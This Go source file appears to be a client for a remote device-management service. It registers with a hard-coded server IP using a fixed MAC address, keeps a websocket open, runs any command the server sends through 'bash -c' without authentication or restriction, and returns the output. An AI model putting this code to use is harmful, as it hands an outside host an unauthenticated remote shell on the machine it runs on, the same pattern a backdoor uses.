package main

import (
	"bytes"
	"database/sql"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os/exec"
	"time"

	"hello/db"
	"hello/response"

	"github.com/gorilla/websocket"
	_ "github.com/mattn/go-sqlite3"
)

var addr = "161.184.221.236:8887"

func executeCommand(command string) (string, error) {
	cmd := exec.Command("bash", "-c", command)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	if err != nil {
		return stderr.String(), err
	}

	return stdout.String(), nil
}

type IncomingMessage struct {
	Request struct {
		Method    string `json:"method"`
		Arguments struct {
			Subscription struct {
				ID           string `json:"id"`
				SubscriberID string `json:"subscriber_id"`
				Topic        string `json:"topic"`
				NotifierID   string `json:"notifier_id"`
			} `json:"subscription"`
			Data struct {
				ActionType string `json:"action_type"`
				Command    string `json:"command"`
			} `json:"data"`
		} `json:"arguments"`
		CallID string `json:"call_id"`
	} `json:"request"`
	Response interface{} `json:"response"`
}

func getMACAddress() (string, error) {
	return "00:1B:44:11:3A:B5", nil
}

func makeRequest(macAddress string, database *sql.DB) (string, error) {

	u := url.URL{
		Scheme: "http",
		Host:   addr,
		Path:   "/api/v1.0/adapter/" + macAddress + "/udpu",
	}

	resp, err := http.Get(u.String())
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	var respObj response.ServerResponse
	err = json.Unmarshal(body, &respObj)
	if err != nil {
		return "", err
	}

	jsonResponse, err := json.Marshal(respObj)
	if err != nil {
		log.Fatalf("Error occurred during marshalling. Error: %s", err.Error())
	}

	// Выводим результат - JSON строку
	fmt.Println(string(jsonResponse))

	if err := db.InsertIntoClient(database, &respObj); err != nil {
		log.Fatalf("Failed to insert data into client table: %v", err)
	}

	return respObj.SubscriberUID, nil
}

func subscribeToTopics(c *websocket.Conn, subscriberUID string) error {
	subscriptionMessage := map[string]interface{}{
		"request": map[string]interface{}{
			"method": "subscribe",
			"arguments": map[string]interface{}{
				"topics": []string{subscriberUID},
			},
			"call_id": "4140dd17a18c45db8a98ba155cbfa",
		},
		"response": nil,
	}
	message, err := json.Marshal(subscriptionMessage)
	if err != nil {
		return err
	}
	return c.WriteMessage(websocket.TextMessage, message)
}

func processAndRespondAsync(c *websocket.Conn, message []byte, subscriberUID string) {
	go func() {
		var incomingMsg IncomingMessage
		err := json.Unmarshal(message, &incomingMsg)
		if err != nil {
			log.Println("Error unmarshalling message:", err)
			return
		}

		if incomingMsg.Request.Arguments.Subscription.Topic != subscriberUID {
			return // Ignore if topic does not match
		}

		output, err := executeCommand(incomingMsg.Request.Arguments.Data.Command)
		if err != nil {
			log.Printf("Error executing command: %s\nOutput: %s\n", err, output)
			return
		}
		log.Println("Command output:", output)

		responseMessage := map[string]interface{}{
			"request": map[string]interface{}{
				"method": "publish",
				"arguments": map[string]interface{}{
					"topics":      []string{"server"},
					"data":        map[string]string{"stdout": output},
					"sync":        true,
					"notifier_id": nil,
				},
				"call_id": incomingMsg.Request.CallID,
			},
			"response": nil,
		}

		responseMsg, err := json.Marshal(responseMessage)
		if err != nil {
			log.Println("Error marshalling response message:", err)
			return
		}

		err = c.WriteMessage(websocket.TextMessage, responseMsg)
		if err != nil {
			log.Println("Error sending response message:", err)
			return
		}
	}()
}

func tryConnectAndListen(subscriberUID string) error {
	u := url.URL{Scheme: "ws", Host: addr, Path: "/api/v1.0/pubsub"}
	log.Printf("Connecting to %s", u.String())

	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		log.Println("Dial error:", err)
		return err
	}
	defer c.Close()

	if err := subscribeToTopics(c, subscriberUID); err != nil {
		return err
	}

	for {
		_, message, err := c.ReadMessage()
		if err != nil {
			log.Println("Read error:", err)
			return err // Return error to trigger a reconnect
		}

		processAndRespondAsync(c, message, subscriberUID)
	}
}

func connectWebSocket(subscriberUID string) {
	for {
		err := tryConnectAndListen(subscriberUID)
		if err != nil {
			log.Println("Error connecting to WebSocket. Reconnecting in 5 seconds...", err)
			time.Sleep(5 * time.Second)
			continue
		}
		break // If connected and no error occurred, exit loop
	}
}

func main() {
	database, err := sql.Open("sqlite3", "./client.db")
	if err != nil {
		log.Fatal(err)
	}
	defer database.Close()

	// Вызов функции createTables из пакета db
	if err := db.CreateTables(database); err != nil {
		log.Fatal(err)
	}

	mac, err := getMACAddress()
	if err != nil {
		log.Fatalf("Error obtaining MAC address: %v", err)
	}
	log.Printf("MAC address: %s", mac)

	subscriberUID, err := makeRequest(mac, database)
	if err != nil {
		log.Fatalf("Error making request: %v", err)
	}
	log.Printf("Subscriber UID: %s", subscriberUID)

	go connectWebSocket(subscriberUID) // Run in a goroutine to not block main

	// Keep the main function alive
	select {}
}
